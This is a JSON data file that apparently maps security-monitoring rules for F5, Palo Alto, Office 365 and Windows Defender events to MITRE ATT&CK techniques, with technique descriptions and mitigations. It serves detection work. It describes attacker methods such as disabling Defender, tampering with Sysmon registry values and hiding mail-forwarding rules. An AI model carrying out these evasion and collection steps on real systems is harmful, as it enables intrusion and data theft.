            "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](\n"
        ],
        "mitigation_strategies": [
            "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies."
        ]
    },
    {
        "rule_id": 65295,
        "rule_description": "F5 BigIP ASM: SQL injection detected: $(code)",
        "mitre_id": [
            "T1190"
        ],
        "possible_attacks": [
            "Exploit Public-Facing Application"
        ],
        "description": [
            "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets. Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion]( or [Exploitation for Client Execution](\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via the [Cloud Instance Metadata API]( exploit container host access via [Escape to Host]( or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities."
        ],
        "mitigation_strategies": [
            "Regularly scan externally facing systems for vulnerabilities and establish procedures to rapidly patch systems when critical vulnerabilities are discovered through scanning and through public disclosure."
        ]
    },
    {
        "rule_id": 64508,
        "rule_description": "Palo Alto Traffic: Session dropped  on $(device_name) from $(source_address) to $(destination_address). Reason: $(session_end_reason). Action: $(action).",
        "mitre_id": [
            "T1072",
            "T1190"
        ],
        "possible_attacks": [
            "Software Deployment Tools",
            "Exploit Public-Facing Application"
        ],
        "description": [
            "Adversaries may gain access to and use centralized software suites installed within an enterprise to execute commands and move laterally through the network. Configuration management and software deployment applications may be used in an enterprise network or cloud environment for routine administration purposes. These systems may also be integrated into CI/CD pipelines. Examples of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft Intune, Azure Arc, and GCP Deployment Manager.  \n\nAccess to network-wide or enterprise-wide endpoint management software may enable an adversary to achieve remote code execution on all connected systems. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.\n\nSaaS-based configuration management services may allow for broad [Cloud Administration Command]( on cloud-hosted instances, as well as the execution of arbitrary commands on on-premises endpoints. For example, Microsoft Configuration Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to Entra ID. Such services may also utilize [Web Protocols]( to communicate back to adversary owned infrastructure.\n\nNetwork infrastructure devices may also have configuration management tools that can be similarly abused by adversaries.\n\nThe permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to access specific functionality.",
            "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets. Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion]( or [Exploitation for Client Execution](\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via the [Cloud Instance Metadata API]( exploit container host access via [Escape to Host]( or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities."
        ],
        "mitigation_strategies": [
            "Have a strict approval policy for use of deployment systems.",
            "Regularly scan externally facing systems for vulnerabilities and establish procedures to rapidly patch systems when critical vulnerabilities are discovered through scanning and through public disclosure."
        ]
    },
    {
        "rule_id": 91542,
        "rule_description": "Office 365: Data loss protection (DLP) events in SharePoint and OneDrive for Business.",
        "mitre_id": [
            "T1213.002"
        ],
        "possible_attacks": [
            "Sharepoint"
        ],
        "description": [
            "Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials (i.e., [Unsecured Credentials](\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources\n"
        ],
        "mitigation_strategies": [
            "Develop and publish policies that define acceptable information to be stored in SharePoint repositories."
        ]
    },
    {
        "rule_id": 91544,
        "rule_description": "Office 365: SharePoint sharing events.",
        "mitre_id": [
            "T1213.002"
        ],
        "possible_attacks": [
            "Sharepoint"
        ],
        "description": [
            "Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials (i.e., [Unsecured Credentials](\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources\n"
        ],
        "mitigation_strategies": [
            "Develop and publish policies that define acceptable information to be stored in SharePoint repositories."
        ]
    },
    {
        "rule_id": 91558,
        "rule_description": "Office 365: Microsoft Power Automate (formerly called Microsoft Flow) events.",
        "mitre_id": [
            "T1137.006"
        ],
        "possible_attacks": [
            "Add-ins"
        ],
        "description": [
            "Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs.  There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. \n\nAdd-ins can be used to obtain persistence because they can be set to execute code when an Office application starts. "
        ],
        "mitigation_strategies": [
            "On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent Office applications from creating child processes and from writing potentially malicious executable content to disk. "
        ]
    },
    {
        "rule_id": 91561,
        "rule_description": "Office 365: Events related to DLP classification in SharePoint.",
        "mitre_id": [
            "T1213.002"
        ],
        "possible_attacks": [
            "Sharepoint"
        ],
        "description": [
            "Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials (i.e., [Unsecured Credentials](\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources\n"
        ],
        "mitigation_strategies": [
            "Develop and publish policies that define acceptable information to be stored in SharePoint repositories."
        ]
    },
    {
        "rule_id": 91704,
        "rule_description": "Office 365: Blocked sharing invitation",
        "mitre_id": [
            "T1136"
        ],
        "possible_attacks": [
            "Create Account"
        ],
        "description": [
            "Adversaries may create an account to maintain access to victim systems. With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.\n\nAccounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection."
        ],
        "mitigation_strategies": [
            "Limit the number of accounts with permissions to create other accounts. Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems."
        ]
    },
    {
        "rule_id": 91707,
        "rule_description": "Office 365: Sent message",
        "mitre_id": [
            "T1114.003"
        ],
        "possible_attacks": [
            "Email Forwarding Rule"
        ],
        "description": [
            "Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim\u2019s organization to use as part of further exploits or operations. Furthermore, email forwarding rules can allow adversaries to maintain persistent access to victim's emails even after compromised credentials are reset by administrators. Most email clients allow users to create inbox rules for various email functions, including forwarding to a different recipient. These rules may be created through a local email application, a web interface, or by command-line interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.\n\nAny user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more. Adversaries may also hide the rule by making use of the Microsoft Messaging API (MAPI) to modify the rule properties, making it hidden and not visible from Outlook, OWA or most Exchange Administration tools.\n\nIn some environments, administrators may be able to enable email forwarding rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions. Adversaries that abuse such features may be able to enable forwarding on all or specific mail an organization receives. "
        ],
        "mitigation_strategies": [
            "Use secure out-of-band authentication methods to verify the authenticity of critical actions initiated via email, such as password resets, financial transactions, or access requests. \n\nFor highly sensitive information, utilize out-of-band communication channels instead of relying solely on email. This reduces the risk of sensitive data being collected through compromised email accounts.\n\nSet up out-of-band alerts to notify security teams of unusual email activities, such as mass forwarding or large attachments being sent, which could indicate email collection attempts.\n\nCreate plans for leveraging a secure out-of-band communications channel, rather than an existing in-network email server, in case of a security incident."
        ]
    },
    {
        "rule_id": 91708,
        "rule_description": "Office 365: Sent message using different permissions",
        "mitre_id": [
            "T1114.003"
        ],
        "possible_attacks": [
            "Email Forwarding Rule"
        ],
        "description": [
            "Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim\u2019s organization to use as part of further exploits or operations. Furthermore, email forwarding rules can allow adversaries to maintain persistent access to victim's emails even after compromised credentials are reset by administrators. Most email clients allow users to create inbox rules for various email functions, including forwarding to a different recipient. These rules may be created through a local email application, a web interface, or by command-line interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.\n\nAny user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more. Adversaries may also hide the rule by making use of the Microsoft Messaging API (MAPI) to modify the rule properties, making it hidden and not visible from Outlook, OWA or most Exchange Administration tools.\n\nIn some environments, administrators may be able to enable email forwarding rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions. Adversaries that abuse such features may be able to enable forwarding on all or specific mail an organization receives. "
        ],
        "mitigation_strategies": [
            "Use secure out-of-band authentication methods to verify the authenticity of critical actions initiated via email, such as password resets, financial transactions, or access requests. \n\nFor highly sensitive information, utilize out-of-band communication channels instead of relying solely on email. This reduces the risk of sensitive data being collected through compromised email accounts.\n\nSet up out-of-band alerts to notify security teams of unusual email activities, such as mass forwarding or large attachments being sent, which could indicate email collection attempts.\n\nCreate plans for leveraging a secure out-of-band communications channel, rather than an existing in-network email server, in case of a security incident."
        ]
    },
    {
        "rule_id": 91715,
        "rule_description": "Office 365: Changed eDiscovery administrator membership",
        "mitre_id": [
            "T1526"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 91716,
        "rule_description": "Office 365: Created eDiscovery administrator",
        "mitre_id": [
            "T1526"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 91717,
        "rule_description": "Office 365: Created eDiscovery case",
        "mitre_id": [
            "T1526"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 91718,
        "rule_description": "Office 365: Created content search",
        "mitre_id": [
            "T1526"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 91724,
        "rule_description": "Office 365: Suspicious download activity by user: $(office_365.UserId)",
        "mitre_id": [
            "T1213.002"
        ],
        "possible_attacks": [
            "Sharepoint"
        ],
        "description": [
            "Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials (i.e., [Unsecured Credentials](\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources\n"
        ],
        "mitigation_strategies": [
            "Develop and publish policies that define acceptable information to be stored in SharePoint repositories."
        ]
    },
    {
        "rule_id": 91725,
        "rule_description": "Office 365: User $(office_365.UserId) got FullAccess permissions in Exchange",
        "mitre_id": [
            "T1098.002"
        ],
        "possible_attacks": [
            "Additional Email Delegate Permissions"
        ],
        "description": [
            "Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account. \n\nFor example, the <code>Add-MailboxPermission</code> [PowerShell]( cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox. In Google Workspace, delegation can be enabled via the Google Admin console and users can delegate accounts via their Gmail settings. \n\nAdversaries may also assign mailbox folder permissions through individual folder permissions or roles. In Office 365 environments, adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store (root), Inbox, or other mailbox folders. By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target user\u2019s mail folders.\n\nThis may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can add [Additional Cloud Roles]( to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: [Internal Spearphishing]( so the messages evade spam/phishing detection mechanisms."
        ],
        "mitigation_strategies": [
            "Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems."
        ]
    },
    {
        "rule_id": 92000,
        "rule_description": "Scripting interpreter spawned a new process",
        "mitre_id": [
            "T1059.005"
        ],
        "possible_attacks": [
            "Visual Basic"
        ],
        "description": [
            "Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model]( and the [Native API]( through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications. VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript]( on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment]( payloads (which may also involve [Mark-of-the-Web Bypass]( to enable execution)."
        ],
        "mitigation_strategies": [
            "Script blocking extensions can help prevent the execution of scripts and HTA files that may commonly be used during the exploitation process. For malicious code served up through ads, adblockers can help prevent that code from executing in the first place."
        ]
    },
    {
        "rule_id": 92001,
        "rule_description": "Scripting interpreter spawned new scripting interpreter",
        "mitre_id": [
            "T1059"
        ],
        "possible_attacks": [
            "Command and Scripting Interpreter"
        ],
        "description": [
            "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell]( while Windows installations include the [Windows Command Shell]( and [PowerShell](\n\nThere are also cross-platform interpreters such as [Python]( as well as those commonly associated with client applications such as [JavaScript]( and [Visual Basic](\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access]( payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services]( in order to achieve remote Execution."
        ],
        "mitigation_strategies": [
            "Script blocking extensions can help prevent the execution of scripts and HTA files that may commonly be used during the exploitation process. For malicious code served up through ads, adblockers can help prevent that code from executing in the first place."
        ]
    },
    {
        "rule_id": 92002,
        "rule_description": "Scripting interpreter spawned Windows command shell instance",
        "mitre_id": [
            "T1059.003"
        ],
        "possible_attacks": [
            "Windows Command Shell"
        ],
        "description": [
            "Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd]( is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services]( such as [SSH](\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage [cmd]( to execute various commands and payloads. Common uses include [cmd]( to execute a single command, or abusing [cmd]( interactively with input and output forwarded over a command and control channel."
        ],
        "mitigation_strategies": [
            "Use application control where appropriate."
        ]
    },
    {
        "rule_id": 92003,
        "rule_description": "Scripting interpreter spawned a process from a suspicious path",
        "mitre_id": [
            "T1059"
        ],
        "possible_attacks": [
            "Command and Scripting Interpreter"
        ],
        "description": [
            "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell]( while Windows installations include the [Windows Command Shell]( and [PowerShell](\n\nThere are also cross-platform interpreters such as [Python]( as well as those commonly associated with client applications such as [JavaScript]( and [Visual Basic](\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access]( payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services]( in order to achieve remote Execution."
        ],
        "mitigation_strategies": [
            "Script blocking extensions can help prevent the execution of scripts and HTA files that may commonly be used during the exploitation process. For malicious code served up through ads, adblockers can help prevent that code from executing in the first place."
        ]
    },
    {
        "rule_id": 92004,
        "rule_description": "Powershell process spawned Windows command shell instance",
        "mitre_id": [
            "T1059.003"
        ],
        "possible_attacks": [
            "Windows Command Shell"
        ],
        "description": [
            "Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd]( is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services]( such as [SSH](\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage [cmd]( to execute various commands and payloads. Common uses include [cmd]( to execute a single command, or abusing [cmd]( interactively with input and output forwarded over a command and control channel."
        ],
        "mitigation_strategies": [
            "Use application control where appropriate."
        ]
    },
    {
        "rule_id": 92005,
        "rule_description": "Command shell started script with /c modifier",
        "mitre_id": [
            "T1059"
        ],
        "possible_attacks": [
            "Command and Scripting Interpreter"
        ],
        "description": [
            "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell]( while Windows installations include the [Windows Command Shell]( and [PowerShell](\n\nThere are also cross-platform interpreters such as [Python]( as well as those commonly associated with client applications such as [JavaScript]( and [Visual Basic](\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access]( payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services]( in order to achieve remote Execution."
        ],
        "mitigation_strategies": [
            "Script blocking extensions can help prevent the execution of scripts and HTA files that may commonly be used during the exploitation process. For malicious code served up through ads, adblockers can help prevent that code from executing in the first place."
        ]
    },
    {
        "rule_id": 92006,
        "rule_description": "Powershell script compiling code using CSC.exe, possible malware drop",
        "mitre_id": [
            "T1027.004"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 92007,
        "rule_description": "Possible tampering on Windows Defender configuration by Powershell command",
        "mitre_id": [
            "T1562"
        ],
        "possible_attacks": [
            "Impair Defenses"
        ],
        "description": [
            "Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.\n\nAdversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out, preventing a system from shutting down, or disabling or modifying the update process. Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components. These restrictions can further enable malicious operations as well as the continued propagation of incidents.\n\n"
        ],
        "mitigation_strategies": [
            "Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security/logging services."
        ]
    },
    {
        "rule_id": 92008,
        "rule_description": "Windows Defender real time monitoring was disabled by Powershell command",
        "mitre_id": [
            "T1562.001"
        ],
        "possible_attacks": [
            "Disable or Modify Tools"
        ],
        "description": [
            "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking]( adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging. \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation]( which may lead to bypassing anti-tampering features."
        ],
        "mitigation_strategies": [
            "Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security services."
        ]
    },
    {
        "rule_id": 92009,
        "rule_description": "Windows Defender Intrusion prevention system was disabled by Powershell command",
        "mitre_id": [
            "T1562.001"
        ],
        "possible_attacks": [
            "Disable or Modify Tools"
        ],
        "description": [
            "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking]( adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging. \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation]( which may lead to bypassing anti-tampering features."
        ],
        "mitigation_strategies": [
            "Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security services."
        ]
    },
    {
        "rule_id": 92010,
        "rule_description": "Windows Defender downloaded file scanning was disabled by Powershell command",
        "mitre_id": [
            "T1562.001"
        ],
        "possible_attacks": [
            "Disable or Modify Tools"
        ],
        "description": [
            "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking]( adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging. \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation]( which may lead to bypassing anti-tampering features."
        ],
        "mitigation_strategies": [
            "Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security services."
        ]
    },
    {
        "rule_id": 92011,
        "rule_description": "Windows Defender script scanning was disabled by Powershell command",
        "mitre_id": [
            "T1562.001"
        ],
        "possible_attacks": [
            "Disable or Modify Tools"
        ],
        "description": [
            "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking]( adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging. \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.\n\nIn 